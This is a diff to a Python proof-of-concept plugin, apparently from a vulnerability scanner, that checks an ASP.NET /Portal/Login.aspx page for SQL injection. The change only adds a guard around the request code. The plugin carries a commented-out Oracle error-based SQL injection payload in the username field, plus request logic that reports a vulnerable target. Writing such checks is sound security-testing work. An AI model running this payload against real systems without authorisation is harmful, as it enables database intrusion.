@@ -39,9 +39,10 @@ class Poc(ABPoc):
             if code != 200:
                 return
             patten = re.findall(r'value=\"(?P<aa>[\w\+\/\=]{1,}?)\"',res)
-            p1 = urllib.quote(patten[0])
-            p2 = urllib.quote(patten[1])
-            raw = '''
+            if patten:
+                p1 = urllib.quote(patten[0])
+                p2 = urllib.quote(patten[1])
+                raw = '''
 POST /Portal/Login.aspx HTTP/1.1
 Host: 127.0.0.1
 Proxy-Connection: keep-alive
@@ -56,11 +57,11 @@ __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE='''+p1+'''&__EVENTVALIDATION='''+p2+
     '''
     #payload = '''__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE='''+p1+'''&__EVENTVALIDATION='''+p2+'''&username=admin' AND 8270=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(98)||CHR(117)||CHR(103)||CHR(115)||CHR(99)||CHR(97) ||CHR(110))) FROM DUAL) AND 'aaa'='aaa&password=admin&btnSubmit='''
     #print '-d "'+payload+'" '+preWork
-            code, head, res, errcode, _ = hh.http(preWork, raw=raw)
-            if code == 200 and "testvul" in res:
-                #security_hole(preWork)
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                    target=self.target, name=self.vuln.name))
+                code, head, res, errcode, _ = hh.http(preWork, raw=raw)
+                if code == 200 and "testvul" in res:
+                    #security_hole(preWork)
+                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                        target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
